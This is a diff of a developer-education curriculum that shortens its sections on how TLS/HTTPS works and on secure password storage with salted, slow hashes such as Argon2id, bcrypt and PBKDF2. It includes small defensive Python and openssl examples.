-        -- from this point on, every byte of the actual HTTP request/response
-           is encrypted with that shared key --
+TLS 1.2: often 2 RTTs after TCP before application data
+TLS 1.3: 1 RTT (resumption / 0-RTT can go lower; 0-RTT data is replayable
+         — only safe for idempotent requests, Phase 59)
 ```
 
-**PICTURE IT LIKE THIS**
-
-Two people want to talk privately in a room full of people who can hear everything. They cannot simply agree on a code word out loud, because everyone would hear it. So they use a trick: each publicly announces one number, keeps a second number secret, and combines the announced number with their own secret. Because of how the combination works, they both end up holding the same final number, and nobody listening can compute it from the two announced numbers alone. That is Diffie-Hellman, and it is why a shared secret can be established in public.
-
-The certificate is the other half. Before the private conversation begins, one person hands over an ID card. The card is not secret, and its value comes entirely from being signed by an authority whose signature you already recognize and cannot forge. You are not trusting the card, you are trusting the signature on it, and you are trusting it only because you already independently trust the signer. Certificate authorities are that signer, your browser's root store is your prior list of recognized signatures, and this is why a self-signed certificate produces a warning: the encryption is identical, the signature is from someone you have no reason to trust.
-
-Forward secrecy is the detail that makes the analogy complete. The two people burn their shared number when the conversation ends. Someone who recorded the whole conversation, and who later breaks into one person's house and steals their long-term ID card, still has nothing, because the ID card was never what protected the words.
-
-**Internal Working, TLS 1.2 versus TLS 1.3 round trips**
-
-```text
-TLS 1.2  (2 round trips before the first HTTP byte)
-
-  Client                                          Server
-    |------------- ClientHello ---------------------->|   RTT 1
-    |<---- ServerHello + Certificate + ServerKeyEx ---|
-    |------------- ClientKeyExchange --------------->|   RTT 2
-    |<------------ Finished --------------------------|
-    |============= application data ================>|
-
-  With TCP's own handshake (Phase 56) in front of it:
-      1 RTT (TCP) + 2 RTT (TLS) = 3 RTT before any HTTP is sent
-      On a 100 ms link, that is 300 ms of pure setup.
-
-TLS 1.3  (1 round trip)
-
-  Client                                          Server
-    |-- ClientHello + key share ------------------->|   RTT 1
-    |<- ServerHello + key share + {Cert} + {Fin} ---|
-    |============= application data ===============>|
-
-      1 RTT (TCP) + 1 RTT (TLS) = 2 RTT.  Same link: 200 ms.
-      Braces {} mean already encrypted -- 1.3 encrypts the
-      certificate itself, which 1.2 sent in the clear.
-
-  Resumption (both versions, repeat visit)
-      A ticket from the previous session skips the key exchange.
-      TLS 1.3 allows 0-RTT: application data rides along with the
-      very first packet. Cost: 0-RTT data is replayable by an
-      attacker, so it is only safe for idempotent requests
-      (Phase 59's idempotency, load-bearing again).
-```
-
-**Internal Working, certificate chain validation**
-
-```text
-What the browser actually checks, in order:
-
-   yourbank.com certificate
-        signed by ->  "DigiCert TLS RSA SHA256 2020 CA1"   (intermediate)
-                          signed by ->  "DigiCert Global Root CA"  (root)
-                                            |
-                                   is this in my trust store?
-                                            |
-                                          YES -> chain accepted
-
-   At every link, verify:
-     1. signature valid?        (does the parent's public key verify it)
-     2. within validity dates?  (not expired, not future-dated)
-     3. not revoked?            (OCSP / CRL / stapled response)
-     4. correct usage?          (is this CA allowed to sign certs)
-   And on the leaf only:
-     5. does a SAN entry match the hostname I typed?
-
-   Any single failure -> the browser refuses, loudly.
-   This is the step attackers cannot fake, and therefore the
-   step that turns "an encrypted connection" into
-   "an encrypted connection to the party I intended."
-```
-
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Property                      | Before TLS (plain HTTP) | With TLS 1.2                               | With TLS 1.3                               |
-| ----------------------------- | ----------------------- | ------------------------------------------ | ------------------------------------------ |
-| Round trips before first byte | 1 (TCP only)            | 3                                          | 2, or 1 with resumption, or 0 with 0-RTT   |
-| Confidentiality               | none                    | yes                                        | yes                                        |
-| Integrity                     | none                    | yes                                        | yes                                        |
-| Forward secrecy               | n/a                     | optional, depends on cipher suite          | mandatory                                  |
-| Certificate sent in clear     | n/a                     | yes                                        | no, encrypted                              |
-| Hostname visible to observer  | yes                     | yes, via SNI                               | yes, via SNI unless Encrypted Client Hello |
-| CPU cost per connection       | none                    | asymmetric handshake, then cheap symmetric | same, but fewer negotiation options        |
-| Weak cipher suites available  | n/a                     | many, must be disabled by hand             | removed from the spec                      |
-
-
-The bulk-encryption cost is genuinely negligible on modern hardware because CPUs have dedicated AES instructions, so the real cost of TLS is the handshake latency, not the throughput. This is why the mitigations all target round trips: session resumption, 0-RTT, keeping connections alive, and moving the handshake closer to the user with a CDN. It is also why HTTP/2's single multiplexed connection (Phase 58) pairs so naturally with TLS: one handshake amortized across every request on the page instead of one per connection.
-
-**SMALL WORKING EXAMPLE**
+**Operational details that bite:** **SNI** names the hostname before the cert is chosen (still visible to observers unless Encrypted Client Hello). **HSTS** tells the browser to refuse plain HTTP later, closing the "first request in the clear" gap. Prefer TLS 1.3; disable ancient suites.
 
 ```python
-import socket, ssl, datetime
+import socket, ssl
 
 HOST = "example.com"
-
-# A client that inspects the connection it just made, rather than
-# just using it. This is the shortest way to see what TLS negotiated.
-context = ssl.create_default_context()
-# create_default_context() already: verifies the cert chain, checks the
-# hostname, and disables everything below TLS 1.2. Weakening any of those
-# is how most "why is my TLS insecure" bugs are introduced.
+context = ssl.create_default_context()  # verify chain + hostname; TLS ≥ 1.2
 
 with socket.create_connection((HOST, 443), timeout=10) as raw:
     with context.wrap_socket(raw, server_hostname=HOST) as tls:
-        # server_hostname is what sends SNI *and* what the hostname
-        # check is performed against. Omitting it silently disables
-        # hostname verification in some configurations.
-        print("negotiated version :", tls.version())
-        print("cipher suite       :", tls.cipher()[0])
-
+        print("version:", tls.version())
+        print("cipher :", tls.cipher()[0])
         cert = tls.getpeercert()
-        print("subject            :", dict(x[0] for x in cert["subject"])["commonName"])
-        print("issuer             :", dict(x[0] for x in cert["issuer"])["commonName"])
-        print("valid until        :", cert["notAfter"])
-
-        expires = datetime.datetime.strptime(cert["notAfter"], "%b %d %H:%M:%S %Y %Z")
-        print("days remaining     :", (expires - datetime.datetime.utcnow()).days)
-
-        names = [v for k, v in cert.get("subjectAltName", ()) if k == "DNS"]
-        print("valid for          :", ", ".join(names[:5]))
-
-        # Now speak HTTP over the encrypted channel. Note that nothing
-        # about the HTTP layer changed -- this is exactly the request
-        # from Phase 58, and that is the whole point of layering.
+        print("subject:", dict(x[0] for x in cert["subject"]).get("commonName"))
         tls.sendall(f"GET / HTTP/1.1\r\nHost: {HOST}\r\nConnection: close\r\n\r\n".encode())
-        first_line = tls.recv(4096).split(b"\r\n")[0]
-        print("http response      :", first_line.decode())
+        print("http   :", tls.recv(256).split(b"\r\n")[0])
 
-# Proving that verification is real, not decorative:
+# badssl.com shows authentication failures, not "encryption broke":
 for host in ["expired.badssl.com", "wrong.host.badssl.com", "self-signed.badssl.com"]:
     try:
         with socket.create_connection((host, 443), timeout=10) as raw:
             with context.wrap_socket(raw, server_hostname=host):
-                print(f"{host}: connected  <- this would be a bug")
+                print(host, "connected (unexpected)")
     except ssl.SSLCertVerificationError as e:
-        print(f"{host}: refused, {e.verify_message}")
+        print(host, "refused:", e.verify_message)
 ```
 
-```bash
-# The same information from the command line, which is what you will
-# actually reach for when debugging a real certificate problem.
+| Property | Plain HTTP | TLS 1.3 (typical) |
+| -------- | ---------- | ----------------- |
+| Confidentiality / integrity | none | yes |
+| Forward secrecy | n/a | mandatory |
+| Hostname visible (SNI) | yes | usually yes |
+| Real cost | — | handshake latency more than bulk AES |
 
-# Full handshake transcript, chain, and negotiated parameters:
-openssl s_client -connect example.com:443 -servername example.com
+**PRACTICE:**
 
-# Force a version to confirm what a server will and will not accept:
-openssl s_client -connect example.com:443 -tls1_2
-openssl s_client -connect example.com:443 -tls1_1   # should fail
+| Difficulty | Task |
+| ---------- | ---- |
+| Easy | Explain in three sentences why TLS uses asymmetric crypto for the handshake and symmetric for data |
+| Easy | Run the `badssl.com` loop; name which verification step failed for each host |
+| Medium | Use `openssl s_client -connect example.com:443 -servername example.com` and report version, issuer, expiry |
+| Hard | Read [Illustrated TLS 1.3](https://tls13.xargs.org/) once; annotate which messages establish the session key vs authenticate the server |
 
-# Just the expiry dates, which is the check worth automating:
-echo | openssl s_client -connect example.com:443 2>/dev/null \
-  | openssl x509 -noout -dates -subject -issuer
+**WHAT THIS UNLOCKS NEXT:**
 
-# Build your own CA and certificate, then trust it locally. Doing this
-# once makes the entire trust model concrete in a way reading cannot.
-openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
-  -keyout ca.key -out ca.crt -subj "/CN=My Test CA"
-openssl req -newkey rsa:2048 -nodes -keyout site.key -out site.csr \
-  -subj "/CN=local.test"
-openssl x509 -req -in site.csr -CA ca.crt -CAkey ca.key -CAcreateserial \
-  -out site.crt -days 365 -extfile <(printf "subjectAltName=DNS:local.test")
-```
-
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
-
-"What is HTTPS and how does it differ from HTTP" is expected to connect TCP (the reliable channel), TLS (the encryption layer riding on top of it), and HTTP (the application protocol riding on top of *that*) - exactly the layered model from Phase 55, now defended. The follow-up that separates candidates is "why does TLS use both asymmetric and symmetric cryptography," where the expected answer names the performance asymmetry and the key-establishment problem, not just the two words. Beyond that, expect "what does a certificate actually prove and who vouches for it," "what is forward secrecy and why does TLS 1.3 require it," and "you visit a site and get a certificate warning, walk me through every reason that could happen." A strong answer to the last one lists expiry, hostname mismatch, untrusted or self-signed issuer, revocation, and a clock skew on the client, then notes that the encryption is working fine in every one of those cases and it is authentication that failed.
-
-**PRACTICE UNTIL IT FEELS FAMILIAR**
-
-
-| Difficulty | Task                                                                                                                                                                                          |
-| ---------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| Easy       | Run the Python script above against three sites and report the negotiated version and cipher suite for each. Explain why they differ                                                          |
-| Easy       | Run the `badssl.com` loop and write down which specific verification step failed for each of the three hosts                                                                                  |
-| Easy       | Use `openssl s_client` to find the expiry date of a site you use daily, then explain what happens to visitors the day after it expires                                                        |
-| Easy       | Explain in three sentences why TLS uses asymmetric cryptography for the handshake and symmetric for the data                                                                                  |
-| Medium     | Capture a page load in Wireshark, find the `ClientHello`, and list the TLS versions and cipher suites your browser offered. Then find the `ServerHello` and identify what was chosen          |
-| Medium     | Set `SSLKEYLOGFILE`, configure Wireshark to use it, and decrypt your own HTTPS traffic. Explain precisely what you had to possess to do this and why an eavesdropper does not have it         |
-| Medium     | Create your own certificate authority with the commands above, sign a certificate for `local.test`, serve a page over HTTPS with it, and get your browser to accept it without warnings       |
-| Medium     | Run the SSL Labs test against a public site and explain every deduction in its grade in your own words                                                                                        |
-| Medium     | Measure the latency cost of the handshake: time 100 fresh HTTPS connections versus 100 requests over one reused connection, and explain the gap                                               |
-| Medium     | Configure a local server for TLS 1.3 only, confirm with `openssl s_client -tls1_2` that 1.2 is refused, and explain what you gave up and gained                                               |
-| Hard       | Complete [Cryptopals set 1 and 2](https://cryptopals.com/), then explain why CBC mode was removed from TLS 1.3 using what you built                                                           |
-| Hard       | Implement a Diffie-Hellman key exchange from scratch over a socket, derive a shared key on both ends, and verify the two keys match without ever transmitting one                             |
-| Hard       | Read [The Illustrated TLS 1.3 Connection](https://tls13.xargs.org/) end to end, then annotate a real Wireshark capture of your own, byte by byte, against it                                  |
-| Hard       | Explain how certificate transparency detects a misissued certificate, then find a real CT log entry for a domain you own or use                                                               |
-| Hard       | Write down the complete threat model for 0-RTT data: what an attacker can do, which HTTP methods are therefore safe to send in it, and connect the answer back to idempotency from Phase 59 |
-
-
-**WHY THE NEXT TOPIC IS NEEDED - Password Hashing:** TLS protects secrets *in transit*. The login password still has to be verified later (Phase 68), and storing it the naive way turns your database into the most dangerous asset you own. That storage problem is the next section.
+TLS protects secrets *in transit*. The bookstore still must verify passwords later (Phase 68) without storing them readable in Postgres. That storage design — slow salted hashes, not cracking tutorials — is Phase 67.3.
 
 ---
 
 ## 67.3 Password Hashing
 
-**WHY YOU ARE LEARNING THIS:** When Phase 68 builds login and sessions, verification must not require storing the real password. Storing it means that the database from Phase 60 - with its backups, read replicas, logs, and administrators - holds every user's secret in readable form. Because people reuse passwords across services, a breach of your database becomes a breach of email, banking, and work accounts. Password hashing exists because the previous limitation is not that verification was slow, but that the only naive way to do it made your storage layer the most dangerous asset you own.
+When Phase 68 builds login, verification must not require storing Ada's real password. Backups, replicas, logs, and admins all touch the database. People reuse passwords; a plaintext dump becomes a breach of email and banking elsewhere. Password hashing exists because the naive storage design makes your DB the most dangerous asset you own.
 
-**SEE IT BEFORE YOU MEMORIZE IT**
+**FAST HASHES FAIL HERE ON PURPOSE:**
 
-- Best animated explanation: [Password Storage Tier List (Sheep)](https://www.youtube.com/watch?v=qgpsIBLvrGY); [7 Cryptography Concepts EVERY Developer Should Know (Fireship)](https://www.youtube.com/watch?v=NuyzuNBFWxQ) *(Composio YouTube)*; [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) *(Composio fetch)* - ranks every storage approach from plaintext to Argon2 and explains precisely why each rung is worse than the next, which is the most memorable framing of this topic that exists
-- Alternative: [How NOT to Store Passwords! (Computerphile)](https://www.youtube.com/watch?v=8ZtInClXe1Q) - Tom Scott walks the full progression from plaintext through unsalted hashes to rainbow tables. Pair it with [Hashing Algorithms and Security (Computerphile)](https://www.youtube.com/watch?v=b4b8ktEV4Bg) for what a hash function is actually doing
-- Another angle: [Password Hashing, Salts, Peppers (Studying With Alex)](https://www.youtube.com/watch?v=--tnZMuoK3E) covers the salt and pepper distinction cleanly, and [Bcrypt Explained (Ben Awad)](https://www.youtube.com/watch?v=O6cmuiTBZVs) shows the cost factor being tuned in practice
-- Interactive simulator: [bcrypt-generator.com](https://bcrypt-generator.com/) lets you hash the same password repeatedly and watch a different output appear every time, which makes the per-hash salt immediately obvious. Then use [Hashcat](https://hashcat.net/hashcat/) locally against your own hashes to measure how many guesses per second each algorithm survives, and [CrackStation](https://crackstation.net/) to paste an unsalted MD5 or SHA-1 of a common password and watch it reverse instantly, which is the rainbow table argument in one click
-- Written documentation: [OWASP Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) is the definitive current guidance including specific parameters, [NIST SP 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html) is the standard that overturned decades of bad password-policy advice, and [How To Safely Store A Password (Coda Hale)](https://codahale.com/how-to-safely-store-a-password/) remains the clearest short essay on the subject
-- GitHub implementation: [libsodium](https://github.com/jedisct1/libsodium) for the recommended primitives, [the reference Argon2 implementation](https://github.com/P-H-C/phc-winner-argon2) from the competition that selected it, and [py-bcrypt](https://github.com/pyca/bcrypt) which is small enough to see exactly where the cost factor enters the loop
-- Practice platform: [PortSwigger's authentication labs](https://portswigger.net/web-security/authentication) for the application-level bugs, and [CryptoHack](https://cryptohack.org/) for the underlying primitives
+General-purpose hashes (SHA-256) are built for *speed*. An attacker with a stolen table does not "decrypt" — they guess, hash, compare. GPUs do billions of fast hashes per second. The defense is a **deliberately slow**, tunable function: **bcrypt**, **scrypt**, or **Argon2id** (current recommendation). Raise the work factor as hardware improves.
 
-**STEP-BY-STEP EXPLANATION**
+**SALT (AND OPTIONAL PEPPER):**
 
-A cryptographic hash function is one-way and deterministic: the same input always yields the same output, and the output cannot be reversed to recover the input. That gets you the basic idea, which is to store the hash and compare hashes at login rather than storing the password. It is not sufficient, and understanding exactly why not is the whole substance of this section.
+Identical passwords must not produce identical stored values. A **salt** is unique random bytes per user, stored with the hash — not secret; its job is to kill rainbow tables and force per-row work. A **pepper** is an optional app-wide secret kept *outside* the DB so a pure dump is harder to attack.
 
-The first problem is that **general-purpose hash functions are designed to be fast**, because their primary uses, verifying file integrity and indexing data, want speed. Speed is precisely wrong here. An attacker holding a stolen hash does not reverse it, they guess: take a candidate password, hash it, compare, repeat. A modern GPU computes billions of SHA-256 hashes per second, so a fast hash means a full dictionary and every common variation is exhausted in minutes. The defence is a **deliberately slow** function, and the mechanism is a **work factor**, a tunable parameter that multiplies the computation required. At a cost factor where legitimate verification takes 250 milliseconds, the attacker's billions per second collapses to a few per second per core, and the arithmetic of brute force stops working. This is why the correct answer is bcrypt, scrypt, or Argon2 rather than SHA-256, and it is why the parameter must be raised over the years as hardware improves.
-
-The second problem is that **identical passwords produce identical hashes**, which leaks far more than it appears to. It means an attacker can see which users share a password, and much worse, it means the guessing work can be done once for everybody. A **rainbow table** is a precomputed mapping from common passwords to their hashes; with an unsalted hash, cracking a database of ten million users costs the same as cracking one. A **salt** is a unique random value per user, stored alongside the hash and hashed together with the password. It is not secret, and it does not need to be, because its only job is to make every user's hash computation distinct. With salts, precomputation is worthless and the attacker must attack each hash separately, which multiplies their cost by the number of users.
-
-A **pepper** is a related but distinct idea: a single secret value, held outside the database in a configuration store or hardware module, mixed into every hash. Because it is not in the database, a pure database breach yields hashes that cannot be attacked at all without also compromising the application's secrets. It buys defence in depth, and its cost is that rotating it requires rehashing on next login.
-
-The **memory-hard** property is what separates the current generation from bcrypt. GPUs and dedicated hardware are enormously parallel but memory-constrained per unit, so an algorithm that requires a large working memory per hash cannot be parallelised cheaply on specialised hardware. scrypt introduced this and Argon2, which won the Password Hashing Competition, tunes memory, time, and parallelism independently. Argon2id, the hybrid variant, is the current default recommendation.
-
-Three implementation details are non-negotiable and are all commonly wrong. Comparison must use a **constant-time** function, because a byte-by-byte comparison that returns early leaks how many bytes matched through its timing, which is exploitable. The login response must be **identical** whether the username does not exist or the password is wrong, and must take the same time, or the endpoint becomes a user enumeration oracle. And the parameters must be **stored with the hash**, which is why the modern formats encode the algorithm, version, cost, and salt into a single string, allowing you to raise the cost factor and transparently upgrade each user's stored hash the next time they log in.
-
-Finally, the policy advice most people learned is now formally discouraged. NIST SP 800-63B recommends against mandatory periodic rotation and against composition rules demanding particular character classes, because both push users toward predictable patterns. It recommends long minimums, generous maximums so passphrases and password managers work, and checking candidates against a list of known-breached passwords, which is the single most effective control available.
-
-**System -> Weakness -> Attack -> Consequence -> Defense**
+**WHAT YOU STORE AND HOW YOU VERIFY:**
 
 ```text
-System:      A login form checks a submitted password against a stored one.
-Weakness:    Storing the password in plain text means anyone with database
-             access (an attacker who breaches the DB, or a rogue insider)
-             instantly has every user's real password.
-Attack:      A database breach (Phase 60's attack surface, realized).
-Consequence: Because people reuse passwords across sites, one breach can
-             compromise a user's accounts on completely unrelated services.
-Defense:     Never store the password itself -- store a HASH of it, run
-             through a slow, purpose-built hashing algorithm (e.g. bcrypt,
-             Argon2 -- NOT a fast general-purpose hash like SHA-256 used
-             alone, which is too fast and makes brute-forcing feasible),
-             combined with a random SALT unique to each user.
-Trade-off:   Verifying a login now costs deliberate, real computation time
-             (that's the point -- it makes brute-forcing every possible
-             password prohibitively slow) instead of a cheap string
-             comparison.
-```
-
-**Why the salt matters specifically:** Without a per-user salt, two users with the same password produce the *same* hash, and an attacker can precompute a giant lookup table (a "rainbow table") of common password hashes once and instantly crack every match across an entire breached database. A unique salt per user means the same password hashes differently for every user, so no precomputed table works - the attacker must brute-force each hash individually.
-
-**PICTURE IT LIKE THIS**
-
-A safe deposit box that opens only when the lock's internal mechanism has to be physically rotated ten thousand times by hand. You, opening your own box once, do not much care that it takes four seconds. A thief who stole the box and wants to try every possible combination cares enormously, because a task that would take an afternoon now takes centuries. That is the work factor: it is not making the lock harder to pick, it is making each attempt expensive, and the defender only ever makes one attempt.
-
-The salt is the locksmith stamping a different unique serial into each box's mechanism, so a master list of combinations made for one box is useless against any other. The serial is engraved visibly on the outside, and that is fine because it was never meant to be secret. Its job is to make sure work done against one box cannot be reused against the next. The pepper is an additional pin that lives in the locksmith's own workshop rather than in the box, so someone who steals the entire vault still cannot open a single box without also burglarising the workshop.
-
-**Internal Working, why a fast hash fails and a slow one does not**
-
-```text
-An attacker has stolen the password table. They do not reverse
-hashes; they guess and compare. Everything depends on rate.
-
-  SHA-256, unsalted, on one consumer GPU
-      ~ 10,000,000,000 guesses / second
-      full 8-char lowercase+digit space (36^8 = 2.8e12)
-          -> about 5 minutes
-      top 10 million common passwords, against ALL users at once
-          -> under a second, because one hash serves every row
-
-  SHA-256, salted, same GPU
-      same raw speed, but the work no longer amortises:
-      10 million users -> 10 million separate attacks
-          -> precomputation is dead; brute force still viable
-
-  bcrypt cost 12, salted, same GPU
-      ~ 20,000 guesses / second
-      that is 500,000x slower than SHA-256
-      top 10 million list against ONE user -> about 8 minutes
-      against 10 million users -> ~150 years of GPU time
-
-  Argon2id (64 MB memory, t=3), same GPU
-      memory requirement means the GPU cannot run thousands of
-      lanes in parallel -- it runs a few dozen
-      ~ hundreds of guesses / second
-
-  Meanwhile, the legitimate cost, once, at login:
-      bcrypt cost 12     ~ 250 ms
-      Argon2id 64 MB     ~ 300 ms and 64 MB of RAM
-
-  The asymmetry IS the defence. Same function, same input,
-  and the defender pays it once while the attacker pays it
-  billions of times.
-```
-
-**Internal Working, what is actually stored and how it is verified**
-
-```text
-REGISTRATION
-  1. user submits "correct horse battery staple"
-  2. generate 16 random bytes of salt  (secrets, never random)
-  3. hash = Argon2id(password, salt, memory=64MB, time=3, lanes=4)
-  4. store ONE string that carries everything needed later:
-
-     $argon2id$v=19$m=65536,t=3,p=4$c29tZXNhbHQ$RdescudvJCsgt3ub+b+dWRWJTmaaJObG
-      ^^^^^^^^  ^^^^  ^^^^^^^^^^^^^ ^^^^^^^^^^^ ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
-      algorithm  ver     parameters      salt              the hash
-
-     The parameters travel WITH the hash. That is what makes
-     raising the cost factor later possible at all.
+REGISTER
+  salt = random(16+)
+  hash = Argon2id(password, salt, memory, time, parallelism)
+  store one string: algorithm + params + salt + hash
 
 LOGIN
-  1. look up the row by username
-  2. if no row: still run a hash against a dummy value, then
-     return the same generic error. Otherwise response timing
-     tells an attacker which usernames exist.
-  3. parse algorithm + parameters + salt out of the stored string
-  4. recompute the hash from the submitted password
-  5. compare with a CONSTANT-TIME comparison
-        ==            leaks the match length through timing
-        compare_digest  does not
-  6. if it matched AND the stored parameters are below current
-     policy: rehash at the new cost and update the row. The user
-     is silently upgraded, and you never needed their plaintext
-     at any other moment.
+  look up by username (if missing: still burn hash time → same error)
+  recompute with stored params; compare with CONSTANT-TIME compare
+  if ok and params outdated: rehash at new cost (transparent upgrade)
 ```
 
-**WHAT YOU GAIN, WHAT IT COSTS, AND WHERE IT CAN FAIL**
-
-
-| Approach                | Attacker guesses/sec (1 GPU) | Precomputation works | Memory-hard | Verdict                                      |
-| ----------------------- | ---------------------------- | -------------------- | ----------- | -------------------------------------------- |
-| Plaintext               | n/a, already has them        | n/a                  | no          | catastrophic                                 |
-| MD5 / SHA-1, unsalted   | $\sim10^{10}$ and up         | yes, instantly       | no          | equivalent to plaintext for common passwords |
-| SHA-256, unsalted       | $\sim10^{10}$                | yes                  | no          | broken                                       |
-| SHA-256, salted         | $\sim10^{10}$ per user       | no                   | no          | still broken, only slower to scale           |
-| PBKDF2, 600k iterations | $\sim10^5$                   | no                   | no          | acceptable, FIPS-compliant, GPU-friendly     |
-| bcrypt, cost 12         | $\sim2\times10^4$            | no                   | partially   | good, widely available, 72-byte input limit  |
-| scrypt                  | $\sim10^3$                   | no                   | yes         | good                                         |
-| Argon2id, 64 MB         | $\sim10^2$                   | no                   | yes         | current recommendation                       |
-
-
-The cost is real and must be budgeted. At 250 milliseconds per verification, a single core handles four logins per second, so a login endpoint needs either concurrency headroom or an explicit queue, and it becomes a denial-of-service target precisely because it is expensive by design. Argon2's memory parameter compounds this: 64 MB per concurrent verification means 100 simultaneous logins want 6.4 GB. The standard mitigations are rate limiting per account and per IP before the hash is computed, and running verification on a thread pool so it never blocks the event loop. Choosing the parameter is therefore a capacity decision, not only a security one, and the honest rule is to pick the highest cost your login traffic can absorb at peak.
-
-**SMALL WORKING EXAMPLE**
+Never invent the primitive — use `argon2-cffi`, `bcrypt`, or libsodium. Comparison with `==` can leak match length via timing; use `hmac.compare_digest` or the library's verify. Wrong password and unknown user must look the same (no user-enumeration oracle). NIST guidance favors long passphrases and breached-password checks over mandatory rotation theater.
 
 ```python
-import secrets, hmac, hashlib, time
+import hmac, hashlib, secrets, time
 
-# ---------------------------------------------------------------
-# In production, use a library: argon2-cffi, bcrypt, or libsodium.
-# Never write the primitive yourself. What follows uses the real
-# library for the recommended path, and then implements PBKDF2 by
-# hand purely so the mechanism is visible.
-# ---------------------------------------------------------------
-
-# --- The recommended path -------------------------------------
-from argon2 import PasswordHasher
-from argon2.exceptions import VerifyMismatchError, InvalidHashError
-
-ph = PasswordHasher(
-    memory_cost=65536,   # 64 MB, the memory-hard parameter
-    time_cost=3,         # iterations over that memory
-    parallelism=4,       # lanes
-)
-
-def register(password: str) -> str:
-    # The salt is generated internally and embedded in the output.
-    # You never store or manage it separately.
-    return ph.hash(password)
-
-def login(stored_hash: str, submitted: str) -> tuple[bool, str | None]:
-    try:
-        ph.verify(stored_hash, submitted)
-    except (VerifyMismatchError, InvalidHashError):
-        return False, None
-    # Transparent upgrade: if this hash was made with weaker
-    # parameters than current policy, rehash it now, while we
-    # legitimately hold the plaintext for the only moment we ever will.
-    if ph.check_needs_rehash(stored_hash):
-        return True, ph.hash(submitted)
-    return True, None
-
-h = register("correct horse battery staple")
-print("stored:", h)
-print("same password hashed again:", register("correct horse battery staple"))
-print("   ^ different output, because the salt differs per hash")
-print("verify correct:", login(h, "correct horse battery staple")[0])
-print("verify wrong  :", login(h, "Correct horse battery staple")[0])
-
-# --- PBKDF2 by hand, to make the work factor concrete ----------
+# Production: argon2-cffi / bcrypt. PBKDF2 here only to show work factor.
 def pbkdf2_hash(password: str, iterations: int = 600_000) -> str:
-    salt = secrets.token_bytes(16)          # secrets, never random
+    salt = secrets.token_bytes(16)
     dk = hashlib.pbkdf2_hmac("sha256", password.encode(), salt, iterations)
-    # Store algorithm + parameters + salt + hash together, so the
-    # cost factor can be raised later without losing the old rows.
     return f"pbkdf2_sha256${iterations}${salt.hex()}${dk.hex()}"
 
 def pbkdf2_verify(stored: str, submitted: str) -> bool:
@@ -13728,88 +11973,43 @@ def pbkdf2_verify(stored: str, submitted: str) -> bool:
     dk = hashlib.pbkdf2_hmac(
         "sha256", submitted.encode(), bytes.fromhex(salt_hex), int(iters)
     )
-    # compare_digest, not ==. A plain == returns as soon as two bytes
-    # differ, so its runtime reveals how many leading bytes matched.
     return hmac.compare_digest(dk.hex(), hash_hex)
 
-# --- Measure the asymmetry yourself ---------------------------
-def timed(label, fn):
-    t = time.perf_counter(); fn(); ms = (time.perf_counter() - t) * 1000
-    print(f"{label:<28} {ms:8.2f} ms   -> {1000/ms:>12,.0f} guesses/sec/core")
-
 pw = "correct horse battery staple"
-timed("sha256 (WRONG for this)", lambda: hashlib.sha256(pw.encode()).hexdigest())
-timed("pbkdf2, 600k iterations",  lambda: pbkdf2_hash(pw))
-timed("argon2id, 64 MB",          lambda: ph.hash(pw))
-# The ratio between the first line and the last is the entire
-# security argument, expressed as a number you measured.
+h1, h2 = pbkdf2_hash(pw), pbkdf2_hash(pw)
+print("same password, different salts → different strings:", h1 != h2)
+print("verify ok:", pbkdf2_verify(h1, pw))
+print("verify bad:", pbkdf2_verify(h1, "wrong"))
 
-# --- Not leaking which usernames exist ------------------------
-DUMMY = ph.hash("this value exists only to burn the same time")
-
-def login_endpoint(username: str, password: str, db) -> tuple[int, str]:
-    row = db.find_user(username)
-    if row is None:
-        # Verify against a throwaway hash anyway, so a missing user
-        # costs the same wall-clock time as a wrong password.
-        try: ph.verify(DUMMY, password)
-        except Exception: pass
-        return 401, "invalid username or password"   # identical message
-
-    ok, upgraded = login(row.password_hash, password)
-    if not ok:
-        return 401, "invalid username or password"   # identical message
-    if upgraded:
-        db.update_hash(row.id, upgraded)
-    return 200, "ok"
-
-# --- Rejecting known-breached passwords (k-anonymity) ---------
-def is_breached(password: str) -> bool:
-    """Query Have I Been Pwned without ever sending the password.
-
-    Only the first 5 hex characters of the SHA-1 leave your server;
-    the API returns every suffix under that prefix and you match
-    locally. Note SHA-1 is correct HERE precisely because this is
-    not password storage, it is a lookup key.
-    """
-    import urllib.request
-    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
-    prefix, suffix = sha1[:5], sha1[5:]
-    with urllib.request.urlopen(
-        f"https://api.pwnedpasswords.com/range/{prefix}", timeout=5
-    ) as r:
-        body = r.read().decode()
-    return any(line.split(":")[0] == suffix for line in body.splitlines())
+t0 = time.perf_counter()
+hashlib.sha256(pw.encode()).hexdigest()
+fast = (time.perf_counter() - t0) * 1000
+t0 = time.perf_counter()
+pbkdf2_hash(pw)
+slow = (time.perf_counter() - t0) * 1000
+print(f"sha256 ~{fast:.3f} ms vs pbkdf2 ~{slow:.1f} ms — asymmetry is the defense")
 ```
 
-**HOW TO EXPLAIN THIS IN AN INTERVIEW**
+| Approach | Verdict for password storage |
+| -------- | ---------------------------- |
+| Plaintext / MD5 / unsalted SHA | broken |
+| Salted SHA-256 alone | still too fast |
+| PBKDF2 (high iterations) | acceptable where required |
+| bcrypt / scrypt / **Argon2id** | preferred |
 
-"How would you store user passwords" is a standard security question with a specific expected shape: never plaintext, never a fast unsalted hash, always a slow purpose-built algorithm with a per-user salt - and being able to say *why* each part matters, not just name the algorithm. The reliable follow-up is "why not SHA-256," and the answer that lands is that its speed is a feature for its intended purpose and a fatal flaw here, ideally with the guesses-per-second numbers above. Then "does the salt need to be secret," where the correct answer is no along with the reason, and "what is the difference between a salt and a pepper," where the distinction is per-user-and-public versus global-and-secret. Expect "how do you increase your cost factor for existing users without their passwords," which the transparent-rehash-on-login pattern answers, and "why must the wrong-password and unknown-user responses be identical," which is testing whether you think about oracles rather than only about storage. A senior-level version asks about the denial-of-service consequence of making your own login endpoint expensive, and the expected answer is rate limiting ahead of the hash.
+Budget the cost: slow verify is a DoS surface — rate-limit *before* hashing (Phase 69.2).
 
